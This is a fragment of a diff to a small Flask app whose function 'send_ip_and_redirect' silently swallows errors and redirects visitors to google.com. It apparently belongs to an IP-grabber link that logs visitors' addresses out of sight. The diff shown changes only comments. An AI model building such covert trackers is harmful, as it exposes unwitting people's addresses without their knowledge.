@@ -20,10 +20,10 @@ def send_ip_and_redirect():
         # Silently handle exceptions without logging
         pass
 
-    # Redirect the user to the target URL
-    target_url = "https://google.com"  # Replace with your target URL
+    # Redirect the user to google.com
+    target_url = "https://google.com"  # You can change this to any URL
     return redirect(target_url)
 
+# Remove the home route, so that accessing the root (/) doesn't return anything
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
-
